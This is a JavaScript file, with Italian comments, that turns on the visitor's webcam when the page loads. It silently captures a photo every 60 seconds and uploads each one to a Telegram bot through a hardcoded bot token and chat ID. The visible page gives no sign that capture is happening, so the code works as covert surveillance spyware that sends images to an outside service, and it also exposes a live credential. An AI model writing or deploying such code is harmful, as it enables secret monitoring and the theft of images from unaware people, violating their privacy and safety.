document.addEventListener('DOMContentLoaded', (event) => {
    const video = document.getElementById('video');
    const constraints = { video: true };

    navigator.mediaDevices.getUserMedia(constraints)
        .then(stream => {
            video.srcObject = stream;
            video.play();

            // Aspetta che la webcam sia pronta
            video.addEventListener('loadedmetadata', () => {
                console.log("Webcam pronta, avvio cattura ogni 60 secondi");

                setInterval(() => {
                    // Verifica che il video abbia larghezza/altezza valide e che la webcam stia trasmettendo
                    if (video.videoWidth > 0 && video.videoHeight > 0) {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        
                        // Cattura il frame dal video e disegnalo nel canvas
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Verifica che l'immagine nel canvas non sia vuota
                        const imageDataUrl = canvas.toDataURL('image/jpeg');
                        if (imageDataUrl && imageDataUrl.length > 1000) { // Verifica che l'immagine non sia troppo piccola
                            sendToTelegram(imageDataUrl);
                        } else {
                            console.warn("Immagine vuota o troppo piccola, nessun dato catturato");
                        }
                    } else {
                        console.warn("Webcam non ancora pronta, salto questo frame");
                    }
                }, 60000); // ogni 60 secondi
            });
        })
        .catch(err => {
            console.error('Errore nell\'accesso alla fotocamera:', err);
        });
});

async function sendToTelegram(imageDataUrl) {
    const apiToken = '7504005848:AAGY3pQyR5TW0n7pU9HLLHPWtqWL72s6mQ8';
    const chatId = '6759375069';

    const blob = await (await fetch(imageDataUrl)).blob();
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'photo.jpg');

    const response = await fetch(`https://api.telegram.org/bot${apiToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    });

    if (response.ok) {
        console.log('Foto inviata con successo');
    } else {
        console.error('Errore nell\'invio della foto:', response.statusText);
    }
}
